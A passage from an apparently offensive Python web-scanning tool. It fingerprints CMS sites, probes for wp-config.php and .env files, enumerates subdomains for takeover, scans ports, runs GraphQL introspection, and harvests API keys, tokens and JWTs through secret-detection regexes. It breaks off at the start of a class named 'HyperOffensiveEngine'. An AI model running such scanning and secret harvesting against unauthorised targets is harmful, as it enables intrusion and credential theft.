                    print(f"{color}API Endpoints: {len(data['api_endpoints'])}{Colors.RESET}")
                    for api in data['api_endpoints'][:5]:
                        print(f"  - {api}")
                if data.get('secrets'):
                    print(f"{Colors.RED}Secrets Found: {len(data['secrets'])}{Colors.RESET}")
                    for sec in data['secrets'][:3]:
                        print(f"  - {sec.get('type')}: {sec.get('value')}")
                if data.get('jwt_tokens'):
                    print(f"{Colors.YELLOW}JWT Tokens: {len(data['jwt_tokens'])}{Colors.RESET}")
                    for jwt_token in data['jwt_tokens'][:3]:
                        print(f"  - {jwt_token.get('token', '')[:30]}...")
                if data.get('open_ports'):
                    print(f"{color}Open Ports: {', '.join(map(str, data['open_ports'][:10]))}{Colors.RESET}")
                if data.get('graphql_schema'):
                    print(f"{color}GraphQL Schema: Extracted ({data['graphql_schema'].get('types_count', 0)} types){Colors.RESET}")
                if data.get('websocket_endpoints'):
                    print(f"{color}WebSocket: {len(data['websocket_endpoints'])} endpoints{Colors.RESET}")
                if data.get('cors_config', {}).get('wildcard'):
                    print(f"{Colors.RED}CORS Wildcard: DETECTED!{Colors.RESET}")
            
            elif section_key == 'token_bypasses':
                if data.get('bypasses'):
                    print(f"{color}Successful Bypasses: {len(data['bypasses'])}{Colors.RESET}")
                    for bypass in data['bypasses'][:5]:
                        print(f"  - {bypass.get('name')}: {bypass.get('proof', '')[:50]}...")
                if data.get('tokens_extracted'):
                    print(f"{Colors.YELLOW}Tokens Extracted: {len(data['tokens_extracted'])}{Colors.RESET}")
                    for token in data['tokens_extracted'][:3]:
                        print(f"  - {token.get('value', '')[:30]}...")
            
            else:
                for method, d in data.items():
                    if method in ['total_users', 'total_plugins', 'total_themes']:
                        print(f"{color}Total {method.replace('total_', '').capitalize()}: {d}{Colors.RESET}")
                        continue
                    print(f"{Colors.YELLOW}Method: {method}{Colors.RESET}")
                    if isinstance(d, dict) and 'error' in d:
                        print(f"  Error: {d['error']}")
                    elif isinstance(d, list):
                        print(f"  Items Found: {len(d)}")
                        for item in d[:3]:
                            if isinstance(item, dict):
                                print(f"  {json.dumps(item, indent=2)[:100]}")
                        if len(d) > 3:
                            print(f"  ... and {len(d)-3} more items")
            
            print(f"{Colors.BOLD}{Colors.CYAN}╠{'═'*58}╣{Colors.RESET}")
    
    print(f"{Colors.BOLD}{Colors.CYAN}║ REQUEST STATISTICS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}╠{'═'*58}╣{Colors.RESET}")
    print(f"{Colors.GREEN}Total Requests: {raw_data.get('total_requests', 0)}{Colors.RESET}")
    print(f"{Colors.GREEN}Scan Duration: {raw_data.get('scan_duration', 0)} seconds{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}╚{'═'*58}╝{Colors.RESET}\n")

class AdvancedIntelligenceEngine:
    def __init__(self, url, ua, cid, cname):
        self.url = url; self.ua = ua; self.cid = cid; self.cname = cname
        self.results = {}; self.raw_data = {}
    
    def run_all_phases(self):
        inf("Running Intelligence Scanning...")
        phases = [
            self.phase1_core_fingerprinting, self.phase2_version_detection,
            self.phase3_plugin_mapping, self.phase4_theme_analysis,
            self.phase5_configuration, self.phase6_infrastructure,
            self.phase7_data_exposure, self.phase8_api_mapping,
            self.phase9_performance, self.phase10_emerging_tech
        ]
        for phase in phases:
            try: phase()
            except Exception as e:
                if CFG['verbose']: wrn(f"Phase error: {str(e)[:100]}")
        return self.results
    
    def phase1_core_fingerprinting(self):
        inf("Phase 1: Core Fingerprinting...")
        results = {}
        try:
            core_files = {
                'wp': ['wp-includes/version.php', 'wp-load.php', 'wp-config.php'],
                'joom': ['includes/version.php', 'configuration.php', 'libraries/joomla/version.php'],
                'dru': ['core/lib/Drupal.php', 'core/core.extension', 'sites/default/settings.php'],
                'craft': ['craft/app/Craft.php', 'craft/config/general.php'],
                'metinfo': ['app/system/entrance.php', 'config/config_db.php'],
                'laravel': ['vendor/laravel/framework/src/Illuminate/Foundation/Application.php', 'config/app.php'],
                'aem': ['/crx/de/index.jsp', '/system/console/status-bundlelist'],
                'typo3': ['typo3/version.txt', 'typo3/sysext/core/Classes/Version.php']
            }
            if self.cid in core_files:
                for file_path in core_files[self.cid]:
                    r, s = make_request(self.url + file_path, ua=self.ua, timeout=15)
                    results['core_files'] = results.get('core_files', {})
                    results['core_files'][file_path] = {'status': r.status_code if s else 'failed'}
        except: pass
        try:
            r, s = make_request(self.url, ua=self.ua, timeout=20)
            if s and BS4_AVAILABLE:
                soup = BeautifulSoup(r.text, 'html.parser')
                metas = soup.find_all('meta')
                generators = []
                for meta in metas:
                    if meta.get('name', '').lower() in ['generator', 'application-name', 'created-by']:
                        generators.append(meta.get('content', ''))
                if generators: results['generators'] = generators
        except: pass
        self.results['phase1_core'] = results
        self.raw_data['phase1_core'] = results
    
    def phase2_version_detection(self):
        inf("Phase 2: Version Detection...")
        results = {}
        try:
            changelogs = ['changelog.txt', 'CHANGELOG.md', 'changelog.md', 'readme.txt']
            for cl in changelogs:
                r, s = make_request(self.url + cl, ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    versions = re.findall(r'[vV]?(\d+\.\d+\.\d+)', r.text)
                    if versions:
                        results['changelog_versions'] = list(set(versions))[:5]
                        break
        except: pass
        self.results['phase2_version'] = results
        self.raw_data['phase2_version'] = results
    
    def phase3_plugin_mapping(self):
        inf("Phase 3: Plugin Mapping...")
        results = {}
        try:
            if self.cid == 'wp':
                r, s = make_request(self.url + 'wp-content/plugins/', ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    plugins = re.findall(r'href="([^"]+/)"', r.text)
                    plugin_names = [p.rstrip('/') for p in plugins if p not in ['../', '..', '/']]
                    if plugin_names:
                        results['active_plugins'] = plugin_names[:20]
        except: pass
        self.results['phase3_plugins'] = results
        self.raw_data['phase3_plugins'] = results
    
    def phase4_theme_analysis(self):
        inf("Phase 4: Theme Analysis...")
        results = {}
        try:
            if self.cid == 'wp':
                r, s = make_request(self.url + 'wp-content/themes/', ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    themes = re.findall(r'href="([^"]+)/"', r.text)
                    if themes:
                        results['themes_found'] = [t.rstrip('/') for t in themes if t not in ['../', '..'] and t not in ['wp-admin', 'wp-includes', 'wp-content', 'plugins', 'themes', 'uploads']]
        except: pass
        self.results['phase4_themes'] = results
        self.raw_data['phase4_themes'] = results
    
    def phase5_configuration(self):
        inf("Phase 5: Configuration Analysis...")
        results = {}
        try:
            env_files = ['.env', '.env.local', '.env.production', '.env.dev']
            for env in env_files:
                r, s = make_request(self.url + env, ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    results['env_files'] = results.get('env_files', [])
                    results['env_files'].append(env)
        except: pass
        self.results['phase5_config'] = results
        self.raw_data['phase5_config'] = results
    
    def phase6_infrastructure(self):
        inf("Phase 6: Infrastructure Analysis...")
        results = {}
        try:
            r, s = make_request(self.url, ua=self.ua, timeout=20)
            if s:
                cdn_headers = ['CF-RAY', 'x-amz-cf-id', 'x-akamai-transformed', 'x-fastly']
                for header in cdn_headers:
                    if header in r.headers:
                        results['cdn_provider'] = header.split('-')[0] if '-' in header else header
                        break
        except: pass
        self.results['phase6_infra'] = results
        self.raw_data['phase6_infra'] = results
    
    def phase7_data_exposure(self):
        inf("Phase 7: Data Exposure Analysis...")
        results = {}
        try:
            sitemaps = ['sitemap.xml', 'sitemap_index.xml', 'wp-sitemap.xml']
            for smap in sitemaps:
                r, s = make_request(self.url + smap, ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    urls = re.findall(r'<loc>([^<]+)</loc>', r.text)
                    if urls:
                        results['sitemap_urls'] = urls[:20]
                        break
        except: pass
        self.results['phase7_data'] = results
        self.raw_data['phase7_data'] = results
    
    def phase8_api_mapping(self):
        inf("Phase 8: API Mapping...")
        results = {}
        try:
            doc_paths = ['/docs/', '/api-docs/', '/swagger/', '/openapi/']
            for path in doc_paths:
                r, s = make_request(self.url + path, ua=self.ua, timeout=15)
                if s and r.status_code == 200:
                    results['api_docs'] = results.get('api_docs', [])
                    results['api_docs'].append(path)
        except: pass
        self.results['phase8_api'] = results
        self.raw_data['phase8_api'] = results
    
    def phase9_performance(self):
        inf("Phase 9: Performance Analysis...")
        results = {}
        try:
            r, s = make_request(self.url, ua=self.ua, timeout=20)
            if s:
                compression_headers = ['content-encoding', 'accept-encoding']
                for header in compression_headers:
                    if header in r.headers:
                        results['compression'] = results.get('compression', {})
                        results['compression'][header] = r.headers[header]
        except: pass
        self.results['phase9_performance'] = results
        self.raw_data['phase9_performance'] = results
    
    def phase10_emerging_tech(self):
        inf("Phase 10: Emerging Tech Analysis...")
        results = {}
        try:
            r, s = make_request(self.url, ua=self.ua, timeout=20)
            if s:
                headless_patterns = ['graphql', 'contentful', 'strapi', 'ghost']
                for pattern in headless_patterns:
                    if pattern in r.text.lower() or pattern in str(r.headers).lower():
                        results['headless_cms'] = results.get('headless_cms', [])
                        results['headless_cms'].append(pattern)
        except: pass
        self.results['phase10_emerging'] = results
        self.raw_data['phase10_emerging'] = results

class ReconnaissanceEngine:
    def __init__(self, url, ua, session):
        self.url = url; self.ua = ua; self.session = session
        self.results = {}; self.raw_data = {}
    
    def run_all_phases(self):
        inf("Running Reconnaissance Scanning...")
        phases = [
            self.phase_dns_recon, self.phase_subdomain_enum,
            self.phase_technology_detection, self.phase_header_analysis,
            self.phase_ssl_analysis, self.phase_port_scanning,
            self.phase_api_discovery, self.phase_graphql_introspection,
            self.phase_websocket_discovery, self.phase_secret_extraction,
            self.phase_jwt_analysis, self.phase_cors_analysis,
            self.phase_cache_analysis, self.phase_third_party_detection
        ]
        for phase in phases:
            try: phase()
            except Exception as e:
                if CFG['verbose']: wrn(f"Recon phase error: {str(e)[:100]}")
        return self.results
    
    def phase_dns_recon(self):
        inf("Recon Phase 1: DNS Analysis...")
        results = {}
        hostname = urlparse(self.url).hostname
        if DNS_AVAILABLE and COMPONENTS.components.get('dns'):
            try:
                resolver = COMPONENTS.components['dns']
                for rt in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'SRV']:
                    try:
                        answers = resolver.resolve(hostname, rt)
                        results[rt] = [str(r) for r in answers]
                    except: pass
                if results.get('A'):
                    recon_logger.log('SUCCESS', f"  ✓ DNS: {len(results['A'])} A records")
            except: pass
        else:
            try:
                results['A'] = [socket.gethostbyname(hostname)]
                recon_logger.log('SUCCESS', f"  ✓ DNS: {results['A'][0]} (using socket)")
            except: pass
        self.results['dns'] = results
        self.raw_data['dns'] = results
    
    def phase_subdomain_enum(self):
        inf("Recon Phase 2: Subdomain Enumeration...")
        hostname = urlparse(self.url).hostname
        subdomains = []; takeovers = []
        
        common = ['api', 'admin', 'dev', 'test', 'stage', 'prod', 'www', 'mail', 'ftp', 'ssh', 
                  'vpn', 'blog', 'docs', 'wiki', 'support', 'help', 'status', 'monitor', 'cdn',
                  'static', 'media', 'assets', 'files', 'images', 'video', 'app', 'apps', 'mobile',
                  'cloud', 'backup', 'archive', 'auth', 'login', 'signup', 'register', 'portal',
                  'dashboard', 'analytics', 'tracking', 'metrics', 'graphql', 'gateway']
        
        takeover_signatures = {
            'AWS S3': r'NoSuchBucket|The specified bucket does not exist',
            'GitHub Pages': r'There isn\'t a GitHub Pages site here',
            'Heroku': r'No such app|Application not found',
            'Cloudflare': r'This website is powered by Cloudflare',
            'Netlify': r'Page not found', 'Vercel': r'The deployment could not be found',
            'Azure': r'Azure Websites', 'Google Cloud': r'404 Not Found'
        }
        
        for sub in common:
            test = f"{sub}.{hostname}"
            try:
                socket.gethostbyname(test)
                subdomains.append(test)
                try:
                    resp = self.session.get(f"http://{test}", timeout=10, verify=False)
                    for service, pattern in takeover_signatures.items():
                        if re.search(pattern, resp.text, re.I):
                            takeovers.append({'subdomain': test, 'service': service, 'evidence': resp.text[:200]})
                            break
                except: pass
            except: pass
        
        self.results['subdomains'] = subdomains
        self.results['subdomain_takeover'] = takeovers
        self.raw_data['subdomains'] = subdomains
        self.raw_data['subdomain_takeover'] = takeovers
        
        if subdomains:
            recon_logger.log('SUCCESS', f"  ✓ Subdomains: {len(subdomains)} found")
            for sub in subdomains[:5]: recon_logger.log('VERBOSE', f"    • {sub}")
        if takeovers:
            recon_logger.log('WARNING', f"  ⚠ Subdomain Takeover: {len(takeovers)} possible!")
            for item in takeovers[:3]: recon_logger.log('WARNING', f"    • {item['subdomain']} -> {item['service']}")
    
    def phase_technology_detection(self):
        inf("Recon Phase 3: Technology Detection...")
        techs = []
        try:
            resp = self.session.get(self.url, timeout=20, verify=False)
            headers = resp.headers; html = resp.text[:15000]
            
            if 'Server' in headers: techs.append(f"Server: {headers['Server']}")
            if 'X-Powered-By' in headers: techs.append(f"Powered by: {headers['X-Powered-By']}")
            
            framework_patterns = {
                'React': r'react|ReactDOM|react-root', 'Vue.js': r'vue|Vue\.|v-model|v-bind',
                'Angular': r'angular|ng-app|ng-controller', 'jQuery': r'jquery|\$\.|jQuery',
                'Bootstrap': r'bootstrap|\.bootstrap|btn-', 'Tailwind': r'tailwind|\.tailwind',
                'Django': r'django|csrftoken|__csrf', 'Laravel': r'laravel|csrf-token|_token',
                'WordPress': r'wp-content|wp-includes|wp-json', 'Drupal': r'drupal|Drupal|drupal-',
                'Joomla': r'joomla|Joomla|com_', 'Next.js': r'__NEXT|next/', 'Nuxt.js': r'__NUXT|nuxt/',
                'Gatsby': r'gatsby|___gatsby', 'Svelte': r'svelte|__svelte', 'Flask': r'flask|werkzeug',
                'Express': r'express|connect.sid', 'Rails': r'rails|csrf-param',
                'Spring': r'spring|_csrf', 'ASP.NET': r'ASP.NET|__VIEWSTATE',
                'Node.js': r'node|express|connect'
            }
            for framework, pattern in framework_patterns.items():
                if re.search(pattern, html, re.I): techs.append(f"Framework: {framework}")
            
            cms_patterns = {
                'WordPress': r'wp-content|wp-includes|WordPress', 'Drupal': r'drupal|Drupal.settings',
                'Joomla': r'joomla|Joomla|com_', 'Magento': r'magento|Mage\.',
                'Shopify': r'shopify|Shopify\.', 'Wix': r'wix|Wix\.',
                'Webflow': r'webflow|Webflow\.', 'Squarespace': r'squarespace|Squarespace',
                'Ghost': r'ghost|Ghost\.', 'Typo3': r'typo3|TYPO3', 'Laravel': r'laravel|Laravel'
            }
            for cms, pattern in cms_patterns.items():
                if re.search(pattern, html, re.I): techs.append(f"CMS: {cms}")
            
            recon_logger.log('SUCCESS', f"  ✓ Technologies: {len(techs)} detected")
            for tech in techs[:5]: recon_logger.log('VERBOSE', f"    • {tech}")
        except: pass
        self.results['technologies'] = techs
        self.raw_data['technologies'] = techs
    
    def phase_header_analysis(self):
        inf("Recon Phase 4: Header Analysis...")
        try:
            resp = self.session.get(self.url, timeout=20, verify=False)
            headers = dict(resp.headers)
            
            security_headers = {
                'Strict-Transport-Security': 'hsts', 'X-Frame-Options': 'xfo',
                'X-XSS-Protection': 'xss', 'X-Content-Type-Options': 'xcto',
                'Content-Security-Policy': 'csp', 'Referrer-Policy': 'referrer',
                'Permissions-Policy': 'permissions', 'Cross-Origin-Opener-Policy': 'coop',
                'Cross-Origin-Embedder-Policy': 'coep'
            }
            
            present = []
            missing = []
            for header, name in security_headers.items():
                if header in headers:
                    present.append(name); headers[f'_security_{name}'] = 'Present'
                else:
                    missing.append(name); headers[f'_security_{name}'] = 'Missing'
            
            recon_logger.log('SUCCESS', f"  ✓ Headers analyzed")
            if present:
                recon_logger.log('VERBOSE', f"    • Present: {', '.join(present)}")
            if missing:
                recon_logger.log('WARNING', f"    • Missing: {', '.join(missing)}")
            self.results['headers'] = headers
            self.raw_data['headers'] = headers
        except: pass
    
    def phase_ssl_analysis(self):
        inf("Recon Phase 5: SSL/TLS Analysis...")
        hostname = urlparse(self.url).hostname
        try:
            context = ssl.create_default_context()
            context.check_hostname = False; context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((hostname, 443), timeout=15) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {
                        'version': ssock.version(),
                        'cipher': ssock.cipher(),
                        'valid_until': cert.get('notAfter') if cert else None,
                        'issuer': dict(cert.get('issuer', [])) if cert else {},
                        'subject': dict(cert.get('subject', [])) if cert else {}
                    }
                    self.results['ssl_info'] = ssl_info
                    self.raw_data['ssl_info'] = ssl_info
                    recon_logger.log('SUCCESS', f"  ✓ SSL: {ssl_info.get('version', 'N/A')}")
                    recon_logger.log('VERBOSE', f"    • Valid until: {ssl_info.get('valid_until', 'N/A')}")
                    recon_logger.log('VERBOSE', f"    • Cipher: {ssl_info.get('cipher', 'N/A')}")
        except Exception as e:
            recon_logger.log('WARNING', f"  ⚠ SSL analysis failed: {str(e)[:50]}")
            self.results['ssl_info'] = {'error': str(e)}
    
    def phase_port_scanning(self):
        inf("Recon Phase 6: Port Scanning...")
        hostname = urlparse(self.url).hostname
        ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 
                 3306, 5432, 6379, 8080, 8443, 8888, 9000, 27017, 9200]
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((hostname, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except: pass
        self.results['open_ports'] = open_ports
        self.raw_data['open_ports'] = open_ports
        if open_ports:
            recon_logger.log('SUCCESS', f"  ✓ Ports: {len(open_ports)} open")
            recon_logger.log('VERBOSE', f"    • Open: {', '.join(map(str, open_ports[:10]))}")
    
    def phase_api_discovery(self):
        inf("Recon Phase 7: API Discovery...")
        apis = ['/api', '/api/v1', '/api/v2', '/api/v3', '/api/v4', '/rest', '/rest/v1', 
                '/graphql', '/graphiql', '/playground', '/swagger', '/swagger-ui', '/docs', 
                '/redoc', '/openapi', '/oas', '/scalar', '/admin', '/login', '/auth', '/token',
                '/webhook', '/hooks', '/events', '/stream', '/socket', '/users', '/user', 
                '/profile', '/account', '/settings', '/products', '/orders', '/payments', 
                '/search', '/query', '/explore', '/database', '/db', '/data', '/service']
        found = []
        for api in apis:
            test_url = urljoin(self.url, api)
            try:
                resp = self.session.get(test_url, timeout=10, verify=False)
                if resp.status_code < 500:
                    found.append(api)
            except: pass
        self.results['api_endpoints'] = found
        self.raw_data['api_endpoints'] = found
        recon_logger.log('SUCCESS', f"  ✓ APIs: {len(found)} found")
        for api in found[:5]: recon_logger.log('VERBOSE', f"    • {api}")
    
    def phase_graphql_introspection(self):
        inf("Recon Phase 8: GraphQL Introspection...")
        graphql_paths = ['/graphql', '/api/graphql', '/gql', '/query']
        introspection_query = {'query': '{ __schema { types { name kind description fields { name type { name kind } } } queryType { name fields { name } } mutationType { name fields { name } } subscriptionType { name fields { name } } } }'}
        
        for path in graphql_paths:
            test_url = urljoin(self.url, path)
            try:
                resp = self.session.post(test_url, json=introspection_query, timeout=20, verify=False)
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and '__schema' in data['data']:
                        schema = data['data']['__schema']
                        graphql_data = {
                            'url': test_url,
                            'types_count': len(schema.get('types', [])),
                            'has_mutations': bool(schema.get('mutationType')),
                            'has_subscriptions': bool(schema.get('subscriptionType')),
                            'query_fields': [f.get('name') for f in schema.get('queryType', {}).get('fields', [])[:5]],
                            'types': [t.get('name') for t in schema.get('types', []) if not t.get('name', '').startswith('__')][:20]
                        }
                        self.results['graphql_schema'] = graphql_data
                        self.raw_data['graphql_schema'] = graphql_data
                        recon_logger.log('SUCCESS', f"  ✓ GraphQL: Schema extracted ({graphql_data['types_count']} types)")
                        recon_logger.log('VERBOSE', f"    • Mutations: {graphql_data['has_mutations']}")
                        recon_logger.log('VERBOSE', f"    • Subscriptions: {graphql_data['has_subscriptions']}")
                        return
            except: continue
        self.results['graphql_schema'] = {}
        recon_logger.log('WARNING', "  ⚠ GraphQL introspection not available")
    
    def phase_websocket_discovery(self):
        inf("Recon Phase 9: WebSocket Discovery...")
        ws_endpoints = []
        ws_paths = ['/ws', '/websocket', '/socket', '/socket.io', '/socket.io/v2', '/socket.io/v3',
                   '/graphql-ws', '/subscriptions', '/live', '/realtime', '/stream', '/events']
        hostname = urlparse(self.url).hostname
        base_url = f"{'wss' if self.url.startswith('https') else 'ws'}://{hostname}"
        
        if WEBSOCKET_AVAILABLE:
            for path in ws_paths:
                ws_url = base_url + path
                try:
                    ws = websocket.create_connection(ws_url, timeout=5)
                    ws.close()
                    ws_endpoints.append(ws_url)
                except:
                    if 'socket.io' in path:
                        try:
                            resp = self.session.get(f"{self.url}/socket.io/socket.io.js", timeout=10, verify=False)
                            if resp.status_code == 200:
                                ws_endpoints.append(f"{self.url}/socket.io")
                        except: pass
        else:
            recon_logger.log('WARNING', "  ⚠ WebSocket detection requires websocket-client")
        
        self.results['websocket_endpoints'] = ws_endpoints
        self.raw_data['websocket_endpoints'] = ws_endpoints
        if ws_endpoints:
            recon_logger.log('SUCCESS', f"  ✓ WebSocket: {len(ws_endpoints)} found")
            for ws in ws_endpoints[:3]: recon_logger.log('VERBOSE', f"    • {ws}")
    
    def phase_secret_extraction(self):
        inf("Recon Phase 10: Secret Extraction...")
        secrets = []
        patterns = {
            'API Key': r'[A-Za-z0-9]{32,40}',
            'JWT': r'[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+',
            'AWS Key': r'AKIA[A-Za-z0-9]{16}',
            'AWS Secret': r'[A-Za-z0-9/+=]{40}',
            'Google API': r'AIza[A-Za-z0-9\-_]{35}',
            'Bearer': r'Bearer\s+[A-Za-z0-9\-_=]+',
            'Password': r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'Secret': r'secret["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'Token': r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----',
            'Slack Token': r'xox[baprs]-[A-Za-z0-9-]+',
            'GitHub Token': r'gh[pous]_[A-Za-z0-9_]+',
            'Stripe Key': r'sk_(live|test)_[A-Za-z0-9]+',
            'JWT Token': r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'
        }
        try:
            resp = self.session.get(self.url, timeout=25, verify=False)
            content = resp.text
            for name, pattern in patterns.items():
                matches = re.findall(pattern, content, re.I)
                for match in matches:
                    if len(match) > 8 and not match.startswith(('http', 'https', 'www')):
                        if len(match) > 15:
                            secrets.append({'type': name, 'value': match[:50] + '...' if len(match) > 50 else match, 'full': match})
        except: pass
        self.results['secrets'] = secrets
        self.raw_data['secrets'] = secrets
        if secrets:
            recon_logger.log('SUCCESS', f"  ✓ Secrets: {len(secrets)} found")
            for secret in secrets[:3]:
                recon_logger.log('WARNING', f"    • {secret['type']}: {secret['value']}")
    
    def phase_jwt_analysis(self):
        inf("Recon Phase 11: JWT Analysis...")
        jwt_tokens = []
        try:
            resp = self.session.get(self.url, timeout=25, verify=False)
            content = resp.text
            jwt_pattern = r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+'
            matches = re.findall(jwt_pattern, content)
            
            if JWT_AVAILABLE:
                for match in matches:
                    if len(match) > 50:
                        try:
                            payload = jwt.decode(match, options={'verify_signature': False})
                            jwt_tokens.append({'token': match, 'payload': payload, 'decoded': True})
                            recon_logger.log('VERBOSE', f"    ✓ JWT found: {match[:30]}...")
                        except:
                            jwt_tokens.append({'token': match[:30] + '...', 'decoded': False})
            else:
                for match in matches:
                    if len(match) > 50:
                        jwt_tokens.append({'token': match[:30] + '...', 'decoded': False})
                        recon_logger.log('VERBOSE', f"    ✓ JWT found: {match[:30]}...")
            
            if resp.headers.get('Authorization', '').startswith('Bearer '):
                token = resp.headers['Authorization'].replace('Bearer ', '')
                if len(token) > 50:
                    if JWT_AVAILABLE:
                        try:
                            payload = jwt.decode(token, options={'verify_signature': False})
                            jwt_tokens.append({'token': token[:30] + '...', 'payload': payload, 'source': 'Authorization Header', 'decoded': True})
                            recon_logger.log('VERBOSE', f"    ✓ JWT in header: {token[:30]}...")
                        except: pass
                    else:
                        jwt_tokens.append({'token': token[:30] + '...', 'source': 'Authorization Header', 'decoded': False})
            
            for cookie in resp.cookies:
                if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                    token = cookie.value
                    if len(token) > 50:
                        if JWT_AVAILABLE:
                            try:
                                payload = jwt.decode(token, options={'verify_signature': False})
                                jwt_tokens.append({'token': token[:30] + '...', 'payload': payload, 'source': f'Cookie: {cookie.name}', 'decoded': True})
                                recon_logger.log('VERBOSE', f"    ✓ JWT in cookie: {token[:30]}...")
                            except: pass
                        else:
                            jwt_tokens.append({'token': token[:30] + '...', 'source': f'Cookie: {cookie.name}', 'decoded': False})
        except: pass
        
        self.results['jwt_tokens'] = jwt_tokens
        self.raw_data['jwt_tokens'] = jwt_tokens
        if jwt_tokens:
            recon_logger.log('SUCCESS', f"  ✓ JWT: {len(jwt_tokens)} found")
            for jwt_data in jwt_tokens[:3]:
                recon_logger.log('VERBOSE', f"    • {jwt_data.get('token', '')[:30]}... -> {jwt_data.get('payload', {}).get('iss', 'Unknown')}")
    
    def phase_cors_analysis(self):
        inf("Recon Phase 12: CORS Analysis...")
        cors_config = {'url': self.url, 'headers': {}, 'wildcard': False, 'credentials': False, 'methods': [], 'headers_allowed': []}
        try:
            resp = self.session.options(self.url, timeout=20, verify=False)
            cors_config['headers'] = {
                'Access-Control-Allow-Origin': resp.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Methods': resp.headers.get('Access-Control-Allow-Methods'),
                'Access-Control-Allow-Headers': resp.headers.get('Access-Control-Allow-Headers'),
                'Access-Control-Allow-Credentials': resp.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Max-Age': resp.headers.get('Access-Control-Max-Age'),
                'Access-Control-Expose-Headers': resp.headers.get('Access-Control-Expose-Headers')
            }
            if resp.headers.get('Access-Control-Allow-Origin') == '*':
                cors_config['wildcard'] = True
                recon_logger.log('WARNING', f"  ⚠ CORS Wildcard detected!")
            if resp.headers.get('Access-Control-Allow-Credentials') == 'true':
                cors_config['credentials'] = True
            if resp.headers.get('Access-Control-Allow-Methods'):
                cors_config['methods'] = resp.headers['Access-Control-Allow-Methods'].split(',')
            if resp.headers.get('Access-Control-Allow-Headers'):
                cors_config['headers_allowed'] = resp.headers['Access-Control-Allow-Headers'].split(',')
            recon_logger.log('SUCCESS', f"  ✓ CORS Analyzed")
        except: pass
        self.results['cors_config'] = cors_config
        self.raw_data['cors_config'] = cors_config
    
    def phase_cache_analysis(self):
        inf("Recon Phase 13: Cache Analysis...")
        cache_info = {}
        try:
            resp = self.session.get(self.url, timeout=25, verify=False)
            cache_headers = ['Cache-Control', 'Expires', 'ETag', 'Last-Modified', 'Pragma', 'Age', 'Vary']
            for header in cache_headers:
                if header in resp.headers:
                    cache_info[header] = resp.headers[header]
            if 'Cache-Control' in cache_info:
                cc = cache_info['Cache-Control']
                cache_info['analysis'] = {
                    'no_cache': 'no-cache' in cc.lower(),
                    'no_store': 'no-store' in cc.lower(),
                    'must_revalidate': 'must-revalidate' in cc.lower(),
                    'public': 'public' in cc.lower(),
                    'private': 'private' in cc.lower(),
                    'max_age': re.search(r'max-age=(\d+)', cc, re.I)
                }
                if cache_info['analysis']['max_age']:
                    cache_info['analysis']['max_age'] = cache_info['analysis']['max_age'].group(1)
            recon_logger.log('SUCCESS', f"  ✓ Cache Headers Analyzed")
        except: pass
        self.results['cache_headers'] = cache_info
        self.raw_data['cache_headers'] = cache_info
    
    def phase_third_party_detection(self):
        inf("Recon Phase 14: Third-Party Detection...")
        try:
            resp = self.session.get(self.url, timeout=20, verify=False)
            html = resp.text[:20000]
            third_party = {}
            
            cdn_patterns = {
                'Cloudflare': r'cloudflare|cf-|__cf',
                'AWS CloudFront': r'cloudfront|amazonaws',
                'Akamai': r'akamai|akamaiedge',
                'Fastly': r'fastly|x-fastly',
                'StackPath': r'stackpath', 'Edgecast': r'edgecast'
            }
            for name, pattern in cdn_patterns.items():
                if re.search(pattern, html, re.I):
                    third_party['CDN'] = name
                    break
            
            analytics_patterns = {
                'Google Analytics': r'google-analytics|gtag|ga\.js',
                'Facebook Pixel': r'fbq\(|facebook-pixel',
                'Hotjar': r'hotjar|hjs\.', 'Mixpanel': r'mixpanel\.',
                'Segment': r'analytics\.js|segment', 'Amplitude': r'amplitude\.',
                'Intercom': r'intercom\.', 'FullStory': r'fullstory\.'
            }
            analytics = []
            for name, pattern in analytics_patterns.items():
                if re.search(pattern, html, re.I):
                    analytics.append(name)
            if analytics:
                third_party['Analytics'] = analytics
            
            payment_patterns = {
                'Stripe': r'stripe\.|stripe-|pk_|sk_',
                'PayPal': r'paypal\.|paypal-',
                'Square': r'square\.|square-',
                'Razorpay': r'razorpay\.|rzp-',
                'Braintree': r'braintree\.|bt-'
            }
            payments = []
            for name, pattern in payment_patterns.items():
                if re.search(pattern, html, re.I):
                    payments.append(name)
            if payments:
                third_party['Payment'] = payments
            
            self.results['third_party'] = third_party
            self.raw_data['third_party'] = third_party
            recon_logger.log('SUCCESS', f"  ✓ Third-party: {len(third_party)} detected")
            for k, v in third_party.items():
                recon_logger.log('VERBOSE', f"    • {k}: {v}")
        except: pass

class HyperOffensiveEngine:
    def __init__(self, url, ua, cid, cname, version):
        self.url = url; self.ua = ua; self.cid = cid; self.cname = cname
        self.version = version
        self.results = {'successful': [], 'failed': [], 'skipped': []}
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': ua})
        self.session.verify = False
        self.found_creds = {}; self.found_users = []; self.found_files = []
    
    def run_all_phases(self):
